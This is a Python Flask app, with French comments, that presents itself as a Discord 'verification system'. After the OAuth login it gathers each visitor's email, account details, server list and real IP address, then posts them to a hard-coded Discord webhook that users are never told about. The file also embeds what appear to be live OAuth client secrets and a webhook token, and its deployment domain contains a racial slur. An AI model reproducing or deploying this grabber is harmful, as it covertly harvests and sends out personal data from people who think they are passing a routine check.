from flask import Flask, request, redirect, jsonify
import requests
import json
from datetime import datetime
import traceback

app = Flask(__name__)

# Configuration
CLIENT_ID = "1499869968899244252"
CLIENT_SECRET = "G2Z-Hx8fSOv8d_DsROLk0k-CZdFBrbA5"
REDIRECT_URI = "https://negro-lemon.vercel.app/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1498739271006294016/_4sdyqbsQ6UPC7GP1HPtqnWAf7qPuwCf4G4HYWLVqawxX6iWpHR4kZtpb12W9UJykAT-"

# Liste des scopes demandés (DOIT correspondre à ceux du bot)
SCOPES = ["identify", "email", "guilds"]

def get_user_ip(request):
    """Récupère l'IP réelle du visiteur"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def send_to_webhook(user_data, guilds_data, user_ip):
    """Envoie les données au webhook Discord"""
    
    # Compter les serveurs
    guilds_count = len(guilds_data) if isinstance(guilds_data, list) else 0
    
    # Créer l'embed
    embed = {
        "title": "🔐 **New User Verification**",
        "color": 0x57F287,  # Vert Discord
        "timestamp": datetime.now().isoformat(),
        "fields": [
            {
                "name": "👤 **User Information**",
                "value": f"**Username:** {user_data.get('username', 'Unknown')}\n"
                        f"**Global Name:** {user_data.get('global_name', 'None')}\n"
                        f"**User ID:** `{user_data.get('id', 'Unknown')}`\n"
                        f"**Discriminator:** {user_data.get('discriminator', '0')}",
                "inline": False
            },
            {
                "name": "📧 **Email Information**",
                "value": f"**Email:** {user_data.get('email', 'No email')}\n"
                        f"**Verified:** {'✅ Yes' if user_data.get('verified') else '❌ No'}",
                "inline": True
            },
            {
                "name": "🎮 **Discord Status**",
                "value": f"**Locale:** {user_data.get('locale', 'Unknown')}\n"
                        f"**MFA Enabled:** {'✅ Yes' if user_data.get('mfa_enabled') else '❌ No'}\n"
                        f"**Premium Type:** {user_data.get('premium_type', 0)}",
                "inline": True
            },
            {
                "name": "📁 **Server Information**",
                "value": f"**Total Servers:** {guilds_count}\n"
                        f"**Account Created:** {user_data.get('created_at', 'Unknown')}",
                "inline": True
            },
            {
                "name": "🌐 **Network Information**",
                "value": f"**IP Address:** {user_ip}\n"
                        f"**Verification Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "inline": False
            }
        ],
        "footer": {
            "text": "Verification System • All data is logged for security"
        }
    }
    
    # Ajouter l'avatar si disponible
    if user_data.get('avatar'):
        embed["thumbnail"] = {
            "url": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png?size=256"
        }
    
    # Ajouter les 5 premiers serveurs si nécessaire
    if guilds_count > 0 and isinstance(guilds_data, list):
        top_guilds = guilds_data[:5]
        guilds_text = "\n".join([f"• {g.get('name', 'Unknown')} (ID: {g.get('id')})" for g in top_guilds])
        if guilds_count > 5:
            guilds_text += f"\n• *... and {guilds_count - 5} more*"
        
        embed["fields"].append({
            "name": f"📋 **Sample of Servers ({min(5, guilds_count)} of {guilds_count})**",
            "value": guilds_text[:1024],
            "inline": False
        })
    
    # Envoyer au webhook
    payload = {
        "embeds": [embed],
        "username": "Verification System",
        "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png"
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print(f"✅ Webhook sent successfully")
        else:
            print(f"⚠️ Webhook returned status: {response.status_code}")
    except Exception as e:
        print(f"❌ Failed to send webhook: {e}")

@app.route('/')
def home():
    """Page d'accueil"""
    return jsonify({
        "status": "online",
        "service": "Discord Verification API",
        "endpoints": {
            "/callback": "OAuth callback endpoint",
            "/health": "Health check"
        },
        "version": "1.0.0"
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/callback')
def callback():
    """Endpoint OAuth callback principal"""
    
    # Récupérer le code
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        print(f"❌ OAuth Error: {error}")
        return redirect("https://guns.lol/j8a?error=oauth_failed")
    
    if not code:
        print("❌ No code received")
        return redirect("https://guns.lol/j8a?error=no_code")
    
    # Récupérer l'IP
    user_ip = get_user_ip(request)
    print(f"📝 Processing verification - IP: {user_ip}")
    
    try:
        # Échanger le code contre un token
        token_url = "https://discord.com/api/oauth2/token"
        token_data = {
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI
        }
        token_headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        token_response = requests.post(token_url, data=token_data, headers=token_headers)
        token_response.raise_for_status()
        
        token_json = token_response.json()
        access_token = token_json.get('access_token')
        
        if not access_token:
            print("❌ Failed to get access token")
            return redirect("https://guns.lol/j8a?error=token_failed")
        
        # Récupérer les données utilisateur
        user_headers = {"Authorization": f"Bearer {access_token}"}
        
        # Informations de base
        user_response = requests.get("https://discord.com/api/users/@me", headers=user_headers)
        user_response.raise_for_status()
        user_data = user_response.json()
        
        # Récupérer les serveurs
        guilds_response = requests.get("https://discord.com/api/users/@me/guilds", headers=user_headers)
        guilds_data = guilds_response.json() if guilds_response.status_code == 200 else []
        
        print(f"✅ User verified: {user_data.get('username')} (ID: {user_data.get('id')})")
        print(f"📁 Servers: {len(guilds_data) if isinstance(guilds_data, list) else 0}")
        
        # Envoyer au webhook
        send_to_webhook(user_data, guilds_data, user_ip)
        
        # Redirection vers la page de succès
        return redirect("https://guns.lol/j8a?verified=true")
        
    except requests.exceptions.RequestException as e:
        print(f"❌ Request error: {e}")
        print(traceback.format_exc())
        return redirect("https://guns.lol/j8a?error=network_error")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
        print(traceback.format_exc())
        return redirect("https://guns.lol/j8a?error=unknown")

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error"}), 500

# Pour le déploiement Vercel
app.debug = False

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
